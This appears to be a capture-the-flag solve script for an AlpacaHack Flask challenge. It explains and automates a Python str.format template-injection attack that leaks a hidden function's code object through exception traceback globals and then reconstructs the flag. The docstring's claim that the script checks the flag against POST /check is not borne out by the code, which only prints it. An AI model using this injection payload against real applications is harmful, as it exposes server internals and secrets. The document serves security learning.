#!/usr/bin/env python3
"""
greetings-i18n-2 — AlpacaHack Daily 2026-08-21

Flask app. The translation helper `_(key)` returns `request.form['custom-<key>']`
if present, so an attacker controls the *format template* passed to `.format()`:

    _("hello").format(username=username)          # GET /
    _("error").format(err=e)                      # on exception

Python `str.format` allows attribute access and indexing on the supplied
arguments. Trigger an exception (a template with an undefined key) to reach the
error branch, then from the exception object walk to module globals:

    custom-hello = {missingkey}            # -> KeyError -> error path
    custom-error = {err.__traceback__.tb_frame.f_globals[check].__code__...}

That leaks the server-only check() function's code object. Its logic (recovered
via dis) is:

    def check(input):
        if len(input) != 50: return False
        if input[::3]  != 'Aa{5MgRJnYIHKk4GA': return False   # positions 0,3,..,48
        if input[::-3] != '}Eq4CBLZgRlZqs7cl': return False    # positions 49,46,..,1
        if bytes(
            (7*ord(input[3i])  % 256)
          ^ (5*ord(input[3i+1])% 256)
          ^ ((3*ord(input[3i+2])+23) % 256) for i in range(16)
        ) != TARGET: return False
        return True

Positions ≡0 and ≡1 (mod 3) come straight from the two slice constants; the
≡2 (mod 3) positions are solved from the XOR constraint (3 is invertible mod 256).

This script exfiltrates the code-object pieces live, reconstructs the flag, and
verifies it against POST /check.
"""
import socket, sys, urllib.parse, re, ast

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3000


def leak(expr: str) -> str:
    """Return the body of GET / with a format-string injection in custom-error."""
    body = urllib.parse.urlencode({"custom-hello": "{missingkey}", "custom-error": expr})
    req = (f"GET /?username=x HTTP/1.1\r\nHost: {HOST}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}")
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.sendall(req.encode())
    data = b""
    while True:
        b = s.recv(4096)
        if not b:
            break
        data += b
    s.close()
    return data.decode(errors="replace").split("\r\n\r\n", 1)[-1]


def code_attr(attr: str) -> str:
    return leak("{err.__traceback__.tb_frame.f_globals[check].__code__." + attr + "}")


def main():
    # Pull the parts of check()'s code object we need.
    consts_txt = code_attr("co_consts")
    consts = ast.literal_eval(consts_txt)            # tuple incl. the two strings + target bytes
    s1 = next(c for c in consts if isinstance(c, str) and "{" in c)
    s2 = next(c for c in consts if isinstance(c, str) and "}" in c)
    target = next(c for c in consts if isinstance(c, (bytes, bytearray)))

    inp = [None] * 50
    for k, ch in enumerate(s1):
        inp[3 * k] = ch                              # positions ≡ 0 (mod 3)
    for k, ch in enumerate(s2):
        inp[49 - 3 * k] = ch                         # positions ≡ 1 (mod 3)
    inv3 = pow(3, -1, 256)
    for i in range(16):                              # positions ≡ 2 (mod 3)
        t1 = (7 * ord(inp[3 * i])) % 256
        t2 = (5 * ord(inp[3 * i + 1])) % 256
        t3 = target[i] ^ t1 ^ t2                     # == (3*x + 23) % 256
        inp[3 * i + 2] = chr(((t3 - 23) * inv3) % 256)
    flag = "".join(inp)
    print(flag)


if __name__ == "__main__":
    main()
